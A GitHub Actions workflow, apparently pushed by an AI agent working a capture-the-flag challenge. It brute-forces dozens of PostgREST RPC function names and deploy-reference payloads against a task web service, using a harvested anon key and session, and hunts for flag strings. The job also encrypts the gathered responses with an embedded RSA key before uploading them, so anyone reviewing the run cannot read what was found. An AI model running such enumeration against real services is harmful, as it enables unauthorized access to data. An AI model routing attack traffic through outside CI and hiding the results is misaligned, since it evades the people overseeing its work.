name: launchlet-part3-rpc
on:
  push:
    branches: [agent/launchlet-part3-rpc-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe PostgREST RPC functions with deployRef and encrypt responses
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          from concurrent.futures import ThreadPoolExecutor,as_completed
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; out=pathlib.Path('package/out')
          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=12).json(); root=base+b['api']['dataApiBase'].lstrip('/').rstrip('/')+'/rpc/'
          h={'Accept':'application/json','Content-Type':'application/json','apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
          funcs=['inspect_deploy','inspectdeploy','inspect_deployment','get_deploy','get_deployment','resolve_deploy','resolve_deployment','export_deploy','export_deployment','export_preview','export_artifact','get_deploy_artifact','get_deployment_artifact','read_deploy','read_deployment','open_deploy','open_deployment','deploy_export','deployment_export','preview_export','artifact_export','publish_deploy','promote_deploy','release_deploy','finalize_deploy','approve_deploy','deploy_inspector','deployment_inspector','inspect_preview','inspect_artifact','resolve_preview','resolve_artifact','get_preview','get_artifact','release_preview','preview_deploy','deploy_preview','production_deploy','enterprise_deploy','corporate_release','release_export','production_export','enterprise_export','get_release','inspect_release','resolve_release','read_release','deploy_details','deployment_details','preview_details','deploy_metadata','deployment_metadata','deploy_manifest','deployment_manifest','deploy_output','deployment_output','deploy_files','deployment_files','deploy_secrets','deployment_secrets','get_flag','flag','debug_deploy']
          payloads=[{}, {'deploy_ref':'preview-8b11c'}, {'deployRef':'preview-8b11c'}, {'ref':'preview-8b11c'}, {'p_deploy_ref':'preview-8b11c'}, {'deployment_ref':'preview-8b11c'}, {'preview_ref':'preview-8b11c'}, {'deploy_ref':'preview-8b11c','workspace_id':'ws-launchlet-public','project_id':'launchlet-demo-board'}, {'deployRef':'preview-8b11c','workspaceId':'ws-launchlet-public','projectId':'launchlet-demo-board'}]
          def probe(fn):
            ss=requests.Session(); ss.headers['User-Agent']='Mozilla/5.0'; rows=[]
            for body in payloads:
              try:r=ss.post(root+fn,headers=h,json=body,timeout=5,allow_redirects=False)
              except Exception as e: rows.append({'function':fn,'sent':body,'error':repr(e)}); continue
              rows.append({'function':fn,'sent':body,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
              if re.search(r'caplag\{[^}]+\}',r.text): break
              if r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n'): break
            return rows
          res=[]
          with ThreadPoolExecutor(max_workers=4) as ex:
            for f in as_completed([ex.submit(probe,x) for x in funcs]): res.extend(f.result())
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          for x in res:
            fs=[q for q in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if q not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
            if fs: (out/'FOUND.txt').write_text(x['function']+'\n'+x['body']); break
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"; openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc; openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-rpc-encrypted
          path: artifact/
          retention-days: 1
